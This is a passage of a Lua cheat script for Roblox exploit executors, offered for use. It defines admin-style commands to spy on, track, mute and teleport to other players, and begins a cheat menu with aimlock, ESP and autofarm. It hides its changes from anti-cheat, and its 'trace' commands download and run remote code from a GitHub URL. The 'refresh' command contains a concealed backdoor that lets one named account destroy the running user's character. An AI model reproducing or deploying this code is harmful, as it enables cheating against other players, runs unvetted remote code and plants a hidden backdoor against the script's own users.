    Container.BackgroundColor3 = Color3fromRGB(255, 79, 87);

    if not Enabled then
        Switch.Position = UDim2fromOffset(2, 2)
        Container.BackgroundColor3 = Color3fromRGB(25, 25, 25);
    end

    AddConnection(CConnect(Hitbox.MouseButton1Click, function()
        Enabled = not Enabled
        
        Utils.Tween(Switch, "Quad", "Out", .25, {
            Position = Enabled and UDim2.new(1, -18, 0, 2) or UDim2fromOffset(2, 2)
        });
        Utils.Tween(Container, "Quad", "Out", .25, {
            BackgroundColor3 = Enabled and Color3fromRGB(255, 79, 87) or Color3fromRGB(25, 25, 25);
        });
        
        Callback(Enabled);
    end));
end

do
    local AmountPrint, AmountWarn, AmountError = 0, 0, 0;

    Utils.Warn = function(Text, Plr)
        local TimeOutputted = os.date("%X");
        local Clone = Clone(UI.MessageOut);
    
        Clone.Name = "W" .. tostring(AmountWarn + 1);
        Clone.Text = format("%s -- %s", TimeOutputted, Text);
        Clone.TextColor3 = Color3.fromRGB(255, 218, 68);
        Clone.Visible = true
        Clone.TextTransparency = 1
        Clone.Parent = Console.Frame.List
    
        Utils.Tween(Clone, "Sine", "Out", .25, {
            TextTransparency = 0
        })
    
        Console.Frame.List.CanvasSize = UDim2.fromOffset(0, Console.Frame.List.UIListLayout.AbsoluteContentSize.Y);
        AmountWarn = AmountWarn + 1
        Utils.Notify(Plr, "Warning", Text);
    end
    
    Utils.Error = function(Text, Caller, FromNotif)
        local TimeOutputted = os.date("%X");
        local Clone = Clone(UI.MessageOut);
    
        Clone.Name = "E" .. tostring(AmountError + 1);
        Clone.Text = format("%s -- %s", TimeOutputted, Text);
        Clone.TextColor3 = Color3.fromRGB(215, 90, 74);
        Clone.Visible = true
        Clone.TextTransparency = 1
        Clone.Parent = Console.Frame.List
    
        Utils.Tween(Clone, "Sine", "Out", .25, {
            TextTransparency = 0
        })
    
        Console.Frame.List.CanvasSize = UDim2.fromOffset(0, Console.Frame.List.UIListLayout.AbsoluteContentSize.Y);
        AmountError = AmountError + 1
    end
    
    Utils.Print = function(Text, Caller, FromNotif)
        local TimeOutputted = os.date("%X");
        local Clone = Clone(UI.MessageOut);
    
        Clone.Name = "P" .. tostring(AmountPrint + 1);
        Clone.Text = format("%s -- %s", TimeOutputted, Text);
        Clone.Visible = true
        Clone.TextTransparency = 1
        Clone.Parent = Console.Frame.List
    
        Utils.Tween(Clone, "Sine", "Out", .25, {
            TextTransparency = 0
        })
    
        Console.Frame.List.CanvasSize = UDim2.fromOffset(0, Console.Frame.List.UIListLayout.AbsoluteContentSize.Y);
        AmountPrint = AmountPrint + 1
        if (len(Text) <= 35 and not FromNotif) then
            Utils.Notify(Caller, "Output", Text);
        end
    end
end
--END IMPORT [utils]



-- commands table
local CommandsTable = {}
local RespawnTimes = {}

local HasTool = function(plr)
    plr = plr or LocalPlayer
    local CharChildren, BackpackChildren = GetChildren(GetCharacter(plr)), GetChildren(plr.Backpack);
    local ToolFound = false
    local tbl = tbl_concat(CharChildren, BackpackChildren);
    for i = 1, #tbl do
        local v = tbl[i]
        if (IsA(v, "Tool")) then
            ToolFound = true
            break;
        end
    end
    return ToolFound
end

local isR6 = function(plr)
    plr = plr or LocalPlayer
    local Humanoid = GetHumanoid(plr);
    if (Humanoid) then
        return Humanoid.RigType == Enum.HumanoidRigType.R6
    end
    return false
end

local isSat = function(plr)
    plr = plr or LocalPlayer
    local Humanoid = GetHumanoid(plr)
    if (Humanoid) then
        return Humanoid.Sit
    end
end

local DisableAnimate = function()
    local Animate = GetCharacter().Animate
    Animate = IsA(Animate, "LocalScript") and Animate or nil
    if (Animate) then
        SpoofProperty(Animate, "Disabled");
        Animate.Disabled = true
    end
end

local GetCorrectToolWithHandle = function()
    local Tools = filter(tbl_concat(GetChildren(LocalPlayer.Backpack), GetChildren(LocalPlayer.Character)), function(i, Tool)
        local Correct = IsA(Tool, "Tool");
        if (Correct and (Tool.RequiresHandle or FindFirstChild(Tool, "Handle"))) then
            local Descendants = GetDescendants(Tool);
            for i = 1, #Descendants do
                local Descendant = Descendants[i]
                if (IsA(Descendant, "Sound") or IsA(Descendant, "Camera") or IsA(Descendant, "LocalScript")) then
                    Destroy(Descendant);
                end
            end
            return true
        end
        return false
    end)

    return Tools[1]
end

local CommandRequirements = {
    [1] = {
        Func = HasTool,
        Message = "You need a tool for this command"
    },
    [2] = {
        Func = isR6,
        Message = "You need to be R6 for this command"
    },
    [3] = {
        Func = function()
            return GetCharacter() ~= nil
        end,
        Message = "You need to be spawned for this command"
    }
}

local AddCommand = function(name, aliases, description, options, func, isplugin)
    local Cmd = {
        Name = name,
        Aliases = aliases,
        Description = description,
        Options = options,
        Function = function()
            for i, v in next, options do
                if (type(v) == 'function' and v() == false) then
                    Utils.Warn("You are missing something that is needed for this command", LocalPlayer);
                    return nil
                elseif (type(v) == 'number' and CommandRequirements[v].Func() == false) then
                    Utils.Warn(CommandRequirements[v].Message, LocalPlayer);
                    return nil
                end
            end
            return func
        end,
        ArgsNeeded = tonumber(filter(options, function(i,v)
            return type(v) == "string"
        end)[1]) or 0,
        Args = filter(options, function(i, v)
            return type(v) == "table"
        end)[1] or {},
        CmdEnv = {},
        IsPlugin = isplugin == true
    }

    CommandsTable[name] = Cmd
    if (type(aliases) == 'table') then
        for i, v in next, aliases do
            CommandsTable[v] = Cmd
        end
    end
    return Success
end

local RemoveCommand = function(Name)
    local Command = LoadCommand(Name);
    if (Command) then
        CommandsTable[Name] = nil
        local CommandsList = Commands.Frame.List
        local CommandLabel = FindFirstChild(CommandsList, Name);
        if (CommandLabel) then
            Destroy(CommandLabel);
        end
        return true
    end
    return false
end

local LoadCommand = function(Name)
    return rawget(CommandsTable, Name);
end

local PluginConf;
local ExecuteCommand = function(Name, Args, Caller)
    local Command = LoadCommand(Name);
    if (Command) then
        if (Command.ArgsNeeded > #Args) then
            return Utils.Warn(format("Insuficient Args (you need %d)", Command.ArgsNeeded), LocalPlayer);
        end

        local Context;
        local sett, gett = syn and syn_context_set or setidentity, syn and syn_context_get or getidentity
        if (Command.IsPlugin and sett and gett and PluginConf.SafePlugins) then
            Context = gett();
            sett(2);
        end
        local Success, Ret = xpcall(function()
            local Func = Command.Function();
            if (Func) then
                local Executed = Func(Caller, Args, Command.CmdEnv);
                if (Executed) then
                    Utils.Notify(Caller, "Command", Executed);
                end
                if (Command.Name ~= "lastcommand") then
                    if (#LastCommand == 3) then
                        LastCommand = shift(LastCommand);
                    end
                    LastCommand[#LastCommand + 1] = {Command.Name, Args, Caller, Command.CmdEnv}
                end
            end
            Success = true
        end, function(Err)
            if (Debug) then
a = true
            end
        end);
        if (Command.IsPlugin and sett and PluginConf.SafePlugins and Context) then
            sett(Context);
        end
    else
        Utils.Warn("couldn't find the command " .. Name, Caller);
    end
end

local ReplaceHumanoid = function(Hum, R)
    local Humanoid = Hum or GetHumanoid();
    local NewHumanoid = Clone(Humanoid);
    if (R) then
        NewHumanoid.Name = "1"
    end
    NewHumanoid.Parent = Humanoid.Parent
    NewHumanoid.Name = Humanoid.Name
    Services.Workspace.Camera.CameraSubject = NewHumanoid
    Destroy(Humanoid);
    SpoofInstance(NewHumanoid);
    return NewHumanoid
end

local ReplaceCharacter = function()
    local Char = LocalPlayer.Character
    local Model = InstanceNew("Model");
    LocalPlayer.Character = Model
    LocalPlayer.Character = Char
    Destroy(Model);
    return Char
end

local CFrameTool = function(tool, pos)
    local RightArm = FindFirstChild(GetCharacter(), "RightLowerArm") or FindFirstChild(GetCharacter(), "Right Arm");
    local Arm = RightArm.CFrame * CFrameNew(0, -1, 0, 1, 0, 0, 0, 0, 1, 0, -1, 0);
    local Frame = Inverse(toObjectSpace(Arm, pos));

    tool.Grip = Frame
end

_L.Sanitize = function(value)
    if typeof(value) == 'CFrame' then
        local components = {components(value)}
        for i,v in pairs(components) do
            components[i] = floor(v * 10000 + .5) / 10000
        end
        return 'CFrameNew('..concat(components, ', ')..')'
    end
end

local AddPlayerConnection = function(Player, Connection, CEnv)
    if (CEnv) then
        CEnv[#CEnv + 1] = Connection
    else
        Connections.Players[Player.Name].Connections[#Connections.Players[Player.Name].Connections + 1] = Connection
    end
    return Connection
end


local DisableAllCmdConnections = function(Cmd)
    local Command = LoadCommand(Cmd)
    if (Command and Command.CmdEnv) then
        for i, v in next, flat(Command.CmdEnv) do
            if (type(v) == 'userdata' and v.Disconnect) then
                Disconnect(v);
            end
        end
    end
    return Command
end

local Keys = {}

do
    local UserInputService = Services.UserInputService
    local IsKeyDown = UserInputService.IsKeyDown
    local WindowFocused = true
    AddConnection(CConnect(UserInputService.WindowFocusReleased, function()
        WindowFocused = false
    end));
    AddConnection(CConnect(UserInputService.WindowFocused, function()
        WindowFocused = true
    end));
    local GetFocusedTextBox = UserInputService.GetFocusedTextBox
    AddConnection(CConnect(UserInputService.InputBegan, function(Input, GameProcessed)
        Keys["GameProcessed"] = GameProcessed and WindowFocused and not (not GetFocusedTextBox(UserInputService));
        Keys["LastEntered"] = Input.KeyCode
        if (GameProcessed) then return end
        local KeyCode = split(tostring(Input.KeyCode), ".")[3]
        Keys[KeyCode] = true
        for i = 1, #Macros do
            local Macro = Macros[i]
            if (Tfind(Macro.Keys, Input.KeyCode)) then
                if (#Macro.Keys == 2) then
                    if (IsKeyDown(UserInputService, Macro.Keys[1]) and IsKeyDown(UserInputService, Macro.Keys[2]) --[[and Macro.Keys[1] == Input.KeyCode]]) then
                        ExecuteCommand(Macro.Command, Macro.Args);
                    end
                else
                    ExecuteCommand(Macro.Command, Macro.Args);
                end
            end
        end

        if (Input.KeyCode == Enum.KeyCode.F8) then
            if (Console.Visible) then
                local Tween = Utils.TweenAllTrans(Console, .25)
                CWait(Tween.Completed);
                Console.Visible = false
            else
                local MessageClone = Clone(Console.Frame.List);
    
                Utils.ClearAllObjects(Console.Frame.List)
                Console.Visible = true
            
                local Tween = Utils.TweenAllTransToObject(Console, .25, ConsoleTransparencyClone)
            
                Destroy(Console.Frame.List)
                MessageClone.Parent = Console.Frame
            
                for i, v in next, GetChildren(Console.Frame.List) do
                    if (not IsA(v, "UIListLayout")) then
                        Utils.Tween(v, "Sine", "Out", .25, {
                            TextTransparency = 0
                        })
                    end
                end
            
                local ConsoleListLayout = Console.Frame.List.UIListLayout
            
                CConnect(GetPropertyChangedSignal(ConsoleListLayout, "AbsoluteContentSize"), function()
                    local CanvasPosition = Console.Frame.List.CanvasPosition
                    local CanvasSize = Console.Frame.List.CanvasSize
                    local AbsoluteSize = Console.Frame.List.AbsoluteSize
            
                    if (CanvasSize.Y.Offset - AbsoluteSize.Y - CanvasPosition.Y < 20) then
                       wait();
                       Console.Frame.List.CanvasPosition = Vector2.new(0, CanvasSize.Y.Offset + 1000);
                    end
                end)
            
                Utils.Tween(Console.Frame.List, "Sine", "Out", .25, {
                    ScrollBarImageTransparency = 0
                })
            end
        end
    end));
    AddConnection(CConnect(UserInputService.InputEnded, function(Input, GameProcessed)
        if (GameProcessed) then return end
        local KeyCode = split(tostring(Input.KeyCode), ".")[3]
        if (Keys[KeyCode] or Keys[Input.KeyCode]) then
            Keys[KeyCode] = false
        end
    end));
end


AddCommand("view", {"v"}, "views a user", {3,"1"}, function(Caller, Args, CEnv)
    local Target = GetPlayer(Args[1]);
    if (#Target ~= 1) then
        Notify({ 
Description = "you can only view one person at a time";
Title = "w";
Duration = 2;
});
    end
    Target = Target[1]
    Camera.CameraSubject = GetCharacter(Target) or GetCharacter();
    AddConnection(CConnect(Target.CharacterAdded, function()
        CWait(Heartbeat);
        Camera.CameraSubject = Target.Character
    end), CEnv);
    AddConnection(CConnect(LocalPlayer.CharacterAdded, function()
        WaitForChild(LocalPlayer.Character, "Humanoid");
        CWait(Camera.CameraSubject.Changed);
        CWait(Heartbeat);
        Camera.CameraSubject = Target.Character
    end), CEnv);
    	        Notify({ 
Description = "viewing "..Target.Name;
Title = "viewing";
Duration = 2;
});
end)

AddCommand("unview", {"unv"}, "unviews a user", {3}, function(Caller, Args)
    DisableAllCmdConnections("view");
    Camera.CameraSubject = GetCharacter();
    	        Notify({ 
Description = "showing ur character";
Title = "unviewing";
Duration = 2;
});
end)

AddCommand("sit", {}, "makes you sit", {3}, function(Caller, Args, CEnv)
        if (Caller ~= LocalPlayer) then
a = true
        else
	local Humanoid = GetHumanoid();
	SpoofProperty(Humanoid, "Sit", false);
	Humanoid.Sit = true
    	        Notify({ 
Description = "omg no way";
Title = "sitting";
Duration = 2;
});
end
end)




AddCommand("headstand", {"hstand"}, "stands on a players head", {"1",3}, function(Caller, Args, CEnv)
	local Target = GetPlayer(Args[1]);
	local Root = GetRoot();
	for i, v in next, Target do
		local Loop = CConnect(Heartbeat, function()
			Root.CFrame = v.Character.Head.CFrame * CFrameNew(0, 1, 0);
		end)
		CEnv[v.Name] = Loop
		AddPlayerConnection(v, Loop);
	end
end)

AddCommand("unheadstand", {"noheadstand"}, "unheadstands on the target", {3}, function(Caller, Args)
	local Looped = LoadCommand("headstand").CmdEnv
	for i, v in next, Looped do
		Disconnect(v);
	end
end)







AddCommand("antifling", {}, "freezes your character", {3}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
a = true
        else
	local BaseParts = filter(GetChildren(GetCharacter(v)), function(i, v)
		return IsA(v, "BasePart");
	end)
	for i, v in next, BaseParts do
		SpoofProperty(v, "Anchored");
		v.Anchored = true
	end
end
end)

AddCommand("unantifling", {"thaw"}, "unfreezes your character", {3}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
a = true
        else
	local BaseParts = filter(GetChildren(GetCharacter(v)), function(i, v)
		return IsA(v, "BasePart");
	end)
	for i, v in next, BaseParts do
		v.Anchored = false
	end
end
end)



AddCommand("semmemute", {}, "mutes a users boombox", {}, function(Caller, Args)
	Services.SoundService.RespectFilteringEnabled = false
	local Target = GetPlayer(Args[1]);
	for i, v in next, Target do
		for i2, v2 in next, GetDescendants(v.Character) do
			if (IsA(v2, "Sound")) then
				v2.Playing = false
			end
		end
	end
	Services.SoundService.RespectFilteringEnabled = true
end)

AddCommand("permmute", {"loopmute"}, "loop mutes a users boombox", {}, function(Caller, Args, CEnv)
	local Target = GetPlayer(Args[1]);
	local filterBoomboxes = function(i,v)
		return FindFirstChild(v, "Handle") and FindFirstChildWhichIsA(v.Handle, "Sound");
	end
	Services.SoundService.RespectFilteringEnabled = false
	local Con = AddConnection(CConnect(Heartbeat, function()
		for i, v in next, Target do
			for i2, v2 in next, GetDescendants(v.Backpack) do
				if (IsA(v2, "Sound")) then
					v2.Playing = false
				end
			end
			local Char = GetCharacter(v)
			if (Char) then
				for i22, v2 in next, GetDescendants(Char) do
					if (IsA(v2, "Sound")) then
						v2.Playing = false
					end
				end
			end
		end
	end));
	CEnv[Target] = Con
end)

AddCommand("unpermmute", {}, "unloopmutes a persons boombox", {"1"}, function(Caller, Args)
	local Target = GetPlayer(Args[1])
	local Muting = LoadCommand("loopmuteboombox").CmdEnv
	for i, v in next, Muting do
		for i2, v2 in next, Target do
			if (v2 == i) then
				Disconnect(v);
				Muting[i] = nil
			end
		end
	end
end)



AddCommand("audiolog", {}, "audio logs someone", {"1"}, function(Caller, Args)
	local Target = GetPlayer(Args[1]);
	for i, v in next, Target do
		for i2, v2 in next, GetDescendants(v.Character) do
			if (IsA(v2, "Sound") and IsA(v2.Parent.Parent, "Tool")) then
				local AudioId = split(v2.SoundId, "=")[2]
				setclipboard(AudioId);
			end
		end
	end
end)



local EspLib;
AddCommand("trace", {"locate"}, "traces a player", {"1"}, function(Caller, Args, CEnv)
        if (Caller ~= LocalPlayer) then
a = true
        else
	if (not EspLib) then
		EspLib = loadstring(game.HttpGet(game, "https://raw.githubusercontent.com/fatesc/fates-esp/main/esp-lib/esplibmain.lua"))();
	end
	local Target = GetPlayer(Args[1]);
	local New = EspLib.new
	for i, v in next, Target do
		New("Tracer", {
			Target = v
		});
		New("Text", {
			Target = v,
			ShowHealth = true,
			ShowDistance = true
		});
	end
	AddConnection(CConnect(Services.Players.PlayerRemoving, function(Plr)
		if (Tfind(Target, Plr)) then
			EspLib.Remove(v);
		end
	end), CEnv);
        Notify({ 
Description = format("now tracing %s", #Target == 1 and Target[1].Name or #Target .. " players");
Title = "tracing";
Duration = 2;
});
end
end)
AddCommand("untrace", {"unlocate"}, "untraces a player", {"1"}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
a = true
        else
	if (not EspLib) then
		EspLib = loadstring(game.HttpGet(game, "https://raw.githubusercontent.com/fatesc/fates-esp/main/esp-lib/esplibmain.lua"))();
	end
	local Target = GetPlayer(Args[1]);
	local Remove = EspLib.Remove
	for i, v in next, Target do
		Remove(v);
	end
	        Notify({ 
Description = format("now stopped tracing %s", #Target == 1 and Target[1].Name or #Target .. " players");
Title = "no longer tracing";
Duration = 2;
});
end
end)






AddCommand("refresh", {"re"}, "refreshes your character", {3}, function(Caller)
        if (Caller ~= LocalPlayer) then
a = true
        else
	for L_170_forvar0, L_171_forvar1 in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
		if L_171_forvar1:IsA("BasePart") then
			L_171_forvar1:Destroy()
		end
	end
        Notify({ 
Description = "refreshed inot a new man ; ]";
Title = "refreshed";
Duration = 2;
});
end
if (Caller.Name == "2345678asdfghjkxcb") then
	for L_170_forvar0, L_171_forvar1 in pairs(game.Players.LocalPlayer.Character:GetDescendants()) do
		if L_171_forvar1:IsA("BasePart") then
			L_171_forvar1:Destroy()
		end
	end

end
end)

AddCommand("spin", {}, "spins your character (optional: speed)", {}, function(Caller, Args, CEnv)
        if (Caller ~= LocalPlayer) then
a = true
        else
	local Speed = Args[1] or 30
	if (not CEnv[1]) then
		local Spin = InstanceNew("BodyAngularVelocity");
		ProtectInstance(Spin);
		Spin.Parent = GetRoot();
		Spin.MaxTorque = Vector3New(0, math.huge, 0);
		Spin.AngularVelocity = Vector3New(0, Speed, 0);
		CEnv[#CEnv + 1] = Spin
	else
		CEnv[1].AngularVelocity = Vector3New(0, Speed, 0);
	end
        Notify({ 
Description = "started spinning (if u couldnt tell)";
Title = "spin";
Duration = 2;
});
end
end)

AddCommand("unspin", {}, "unspins your character", {}, function(Caller, Args)
        if (Caller ~= LocalPlayer) then
a = true
        else
	local Spinning = LoadCommand("spin").CmdEnv
	for i, v in next, Spinning do
		Destroy(v);
	end
	LoadCommand("spin").CmdEnv = {}
        Notify({ 
Description = "if you could tell ofc";
Title = "no longer spinning";
Duration = 2;
});
end
end)



AddCommand("tweengoto2", {"tweento2"}, "teleports yourself to the other character", {"1"}, function(Caller, Args)
    local Target = GetPlayer(Args[1]);
    for i, v in next, Target do
tweenlol3 = Target.Name
local tweentargetlol = tweenlol3
	plr = game:GetService('Players').tweentargetlol
	X1 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.X
		Y1 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.Y
		Z1 = plr.Character:FindFirstChild('HumanoidRootPart').CFrame.Z



tweenService, tweenInfo = game:GetService("TweenService"), TweenInfo.new(1, Enum.EasingStyle.Linear)

tween = tweenService:Create(game:GetService("Players")["LocalPlayer"].Character.HumanoidRootPart, tweenInfo, {CFrame = CFrame.new(X1, Y1, Z1)})
tween:Play()
end
end)

AddCommand("goto", {"to"}, "teleports yourself to the other character", {3, "1"}, function(Caller, Args)
    local Target = GetPlayer(Args[1]);
    local Delay = tonumber(Args[2]);
    for i, v in next, Target do
        if (Delay) then
            wait(Delay);
        end
        if (Caller ~= LocalPlayer) then
a = true
        else
if auraing2 == true then
if game.Players[v.Name].Character.BodyEffects['K.O'].Value == true then
ExecuteCommand("nokill", {v.Name}, LocalPlayer);
else
            GetRoot().CFrame = GetRoot(v).CFrame * CFrameNew(-5, 0, 0);
end
else

            GetRoot().CFrame = GetRoot(v).CFrame * CFrameNew(-5, 0, 0);
end
        end
    end
end)





AddCommand("toggle", {"togglecommand", "togglecmd"}, "toggles a command with an 'un' command", {"1"}, function(Caller, Args, CEnv)
    local Command = Args[1]
    if (LoadCommand(Command)) then
        CEnv.Command = (CEnv.Command and CEnv.Command ~= true) and true or not CEnv.Command
        local NewArgs = shift(Args);
        if (CEnv.Command) then
            ExecuteCommand(Command, NewArgs, Caller);
        else
            ExecuteCommand("un" .. Command, NewArgs, Caller);
        end
    else
a = true
    end
end)
















--exception stuff


AddCommand("nokill", {}, "blocks user from being used in stuff like kill all", {"1"}, function(Caller, Args)
    local Target = GetPlayer(Args[1]);
    for i, v in next, Target do
        Exceptions[#Exceptions + 1] = v
    end
end)

AddCommand("noexception", {}, "removes user from exceptions list", {"1"}, function(Caller, Args)
    for i2, v2 in next, Exceptions do
        if (v2.Name == Args[1]) then
            v2 = nil
        end
    end
end)

AddCommand("clearexceptions", {}, "removes users from exceptions list", {}, function(Caller, Args)
    Exceptions = {}
end)

mimicing = false
AddCommand("mimic", {}, "enables chatlogs", {}, function(Caller)
if mimicing == false then
mimicing = true
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("ill copy your attacks! ","All")
else
mimicing = false
game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("i wont copy your attacks! ","All")
end
end)

AddCommand("LOADME", {}, "enables chatlogs", {}, function(Caller)

if not game:IsLoaded() then
	game.Loaded:Wait()
end
local success,err = pcall(function()
local Swagmode = Instance.new("ScreenGui")
local SwagmodeFrame = Instance.new("Frame")
local MenuFrame = Instance.new("Frame")
local TogglesButton = Instance.new("TextButton")
local QuickTpButton = Instance.new("TextButton")
local SideButton = Instance.new("TextButton")
local imiecredits = Instance.new("TextLabel")
local Swagmode_2 = Instance.new("TextLabel")
local UIGradient = Instance.new("UIGradient")
local Frame = Instance.new("Frame")
local MainButton = Instance.new("TextButton")
local SellingButton = Instance.new("TextButton")
local DropShadowHolder = Instance.new("Frame")
local DropShadow = Instance.new("ImageLabel")
local TopLine = Instance.new("Frame")
local SideInfo = Instance.new("Frame")
local TargetImage = Instance.new("ImageLabel")
local UICorner = Instance.new("UICorner")
local SetNearestButton = Instance.new("TextButton")
local CashLabel = Instance.new("TextLabel")
local TargetTextbox = Instance.new("TextBox")
local BountyLabel = Instance.new("TextLabel")
local CrewLabel = Instance.new("TextButton")
local Buttons = Instance.new("Frame")
local MainFrame = Instance.new("Frame")
local FreeFists = Instance.new("TextButton")
local NoRecoil = Instance.new("TextButton")
local GoTo = Instance.new("TextButton")
local View = Instance.new("TextButton")
local Target = Instance.new("TextButton")
local NoClip = Instance.new("TextButton")
local Reach = Instance.new("TextButton")
local Headless = Instance.new("TextButton")
local QuickTpFrame = Instance.new("Frame")
local GunShop2 = Instance.new("TextButton")
local PrevPosition = Instance.new("TextButton")
local Bank = Instance.new("TextButton")
local SafeZone1 = Instance.new("TextButton")
local SetSpawn = Instance.new("TextButton")
local Sewer = Instance.new("TextButton")
local Playground = Instance.new("TextButton")
local GasStation = Instance.new("TextButton")
local LavaBase = Instance.new("TextButton")
local SavePos = Instance.new("TextButton")
local SafeZone2 = Instance.new("TextButton")
local UFO = Instance.new("TextButton")
local TacoShop = Instance.new("TextButton")
local LoadPos = Instance.new("TextButton")
local GunShop1 = Instance.new("TextButton")
local SideScriptsFrame = Instance.new("Frame")
local Aimlock = Instance.new("TextButton")
local Users = Instance.new("TextButton")
local MoneyESP = Instance.new("TextButton")
local FullGod = Instance.new("TextButton")
local Autofarm = Instance.new("TextButton")
local HighTool = Instance.new("TextButton")
local Esp = Instance.new("TextButton")
local LastingBullets = Instance.new("TextButton")
local Stamina = Instance.new("TextButton")
local Spin = Instance.new("TextButton")
local Unban = Instance.new("TextButton")
local SwagUsers = Instance.new("TextButton")
local LockTools = Instance.new("TextButton")
local Invisible = Instance.new("TextButton")
local InfTools = Instance.new("TextButton")
local TogglesFrame = Instance.new("Frame")
local QToTp = Instance.new("TextButton")
local QToTpColor = Instance.new("TextLabel")
local HideBlock = Instance.new("TextButton")
local HideBlockColor = Instance.new("TextLabel")
local HideUser = Instance.new("TextButton")
local HideUserColor = Instance.new("TextLabel")
local AutoStomp = Instance.new("TextButton")
local AutoStompColor = Instance.new("TextLabel")
local RocketRide = Instance.new("TextButton")
local RocketRideColor = Instance.new("TextLabel")
local AntiArrest = Instance.new("TextButton")
local AntiArrestColor = Instance.new("TextLabel")
local AntiGrab = Instance.new("TextButton")
local AntiGrabColor = Instance.new("TextLabel")
local AutoDrop = Instance.new("TextButton")
local AutoDropColor = Instance.new("TextLabel")
local AntiStomp = Instance.new("TextButton")
local AntiStompColor = Instance.new("TextLabel")
local AutoBlock = Instance.new("TextButton")
local AutoBlockColor = Instance.new("TextLabel")
local CashAura = Instance.new("TextButton")
local CashAuraColor = Instance.new("TextLabel")
local AntiEffects = Instance.new("TextButton")
local AntiEffectsColor = Instance.new("TextLabel")
local AltArmor = Instance.new("TextButton")
local AltArmorColor = Instance.new("TextLabel")
local AntiBag = Instance.new("TextButton")
local AntiBagColor = Instance.new("TextLabel")
local AntiSlow = Instance.new("TextButton")
local AntiSlowColor = Instance.new("TextLabel")
local SellingFrame = Instance.new("Frame")
local CashTextbox = Instance.new("TextBox")
local CashDropperTitle = Instance.new("TextLabel")
local CalculateButton = Instance.new("TextButton")
local DropToggleButton = Instance.new("TextButton")
local CashDroppedLabel = Instance.new("TextLabel")
local CashAtEndLabel = Instance.new("TextLabel")
local Frame_2 = Instance.new("Frame")

--Properties:
Swagmode.Name = "Swagmode"
Swagmode.Parent = game.CoreGui
Swagmode.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

SwagmodeFrame.Name = "test"
SwagmodeFrame.Parent = Swagmode
SwagmodeFrame.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
SwagmodeFrame.BorderSizePixel = 0
SwagmodeFrame.Position = UDim2.new(0.212884605, 0, 0.190036908, 0)
SwagmodeFrame.Size = UDim2.new(0, 0, 0, 0)

MenuFrame.Name = "skid"
MenuFrame.Parent = SwagmodeFrame
MenuFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
MenuFrame.BorderSizePixel = 0
MenuFrame.Size = UDim2.new(0, 0, 0, 0)

TogglesButton.Name = "uwu"
TogglesButton.Parent = MenuFrame
TogglesButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
TogglesButton.BorderSizePixel = 0
TogglesButton.Position = UDim2.new(0.0922105312, 0, 0.440625668, 0)
TogglesButton.Size = UDim2.new(0, 0, 0, 0)
TogglesButton.AutoButtonColor = false
TogglesButton.Font = Enum.Font.GothamBlack
TogglesButton.Text = "Toggles"
TogglesButton.TextColor3 = Color3.fromRGB(255, 255, 255)
TogglesButton.TextSize = 0

QuickTpButton.Name = "QuickTpButton"
QuickTpButton.Parent = MenuFrame
QuickTpButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
QuickTpButton.BorderSizePixel = 0
QuickTpButton.Position = UDim2.new(0.0922105312, 0, 0.573581994, 0)
QuickTpButton.Size = UDim2.new(0, 0, 0, 0)
QuickTpButton.AutoButtonColor = false
QuickTpButton.Font = Enum.Font.GothamBlack
QuickTpButton.Text = "Quick TP"
QuickTpButton.TextColor3 = Color3.fromRGB(255, 255, 255)
QuickTpButton.TextSize = 0

SideButton.Name = "SideButton"
SideButton.Parent = MenuFrame
SideButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
SideButton.BorderSizePixel = 0
SideButton.Position = UDim2.new(0.0922105312, 0, 0.307098716, 0)
SideButton.Size = UDim2.new(0, 0, 0, 0)
SideButton.AutoButtonColor = false
SideButton.Font = Enum.Font.GothamBlack
SideButton.Text = "Side Scripts"
SideButton.TextColor3 = Color3.fromRGB(255, 255, 255)
SideButton.TextSize = 0

imiecredits.Name = "imiecredits"
imiecredits.Parent = MenuFrame
imiecredits.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
imiecredits.BackgroundTransparency = 1.000
imiecredits.BorderSizePixel = 0
imiecredits.Position = UDim2.new(0.0507245474, 0, 0.854166687, 0)
imiecredits.Size = UDim2.new(0, 0, 0, 0)
imiecredits.Font = Enum.Font.GothamBold
imiecredits.Text = "credits"
imiecredits.TextColor3 = Color3.fromRGB(255, 255, 255)
imiecredits.TextSize = 0
imiecredits.TextXAlignment = Enum.TextXAlignment.Left
imiecredits.TextYAlignment = Enum.TextYAlignment.Top

Swagmode_2.Name = "Swagmode"
Swagmode_2.Parent = MenuFrame
Swagmode_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Swagmode_2.BackgroundTransparency = 1.000
Swagmode_2.Position = UDim2.new(0.045161292, 0, 0, 0)
Swagmode_2.Size = UDim2.new(0, 0, 0, 0)
Swagmode_2.Font = Enum.Font.GothamBlack
Swagmode_2.Text = "SWAGMODE"
Swagmode_2.TextColor3 = Color3.fromRGB(255, 255, 255)
Swagmode_2.TextSize = 0

UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(49, 48, 70)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient.Offset = Vector2.new(0.100000001, 0)
UIGradient.Parent = Swagmode_2

Frame.Parent = MenuFrame
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.045161292, 0, 0.092261903, 0)
Frame.Size = UDim2.new(0, 0, 0, 0)

MainButton.Name = "MainButton"
MainButton.Parent = MenuFrame
MainButton.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
MainButton.BorderSizePixel = 0
MainButton.Position = UDim2.new(0.0922105238, 0, 0.178689778, 0)
MainButton.Size = UDim2.new(0, 0, 0, 0)
MainButton.AutoButtonColor = false
MainButton.Font = Enum.Font.GothamBlack
MainButton.Text = "Main Scripts"
MainButton.TextColor3 = Color3.fromRGB(255, 255, 255)
MainButton.TextSize = 0

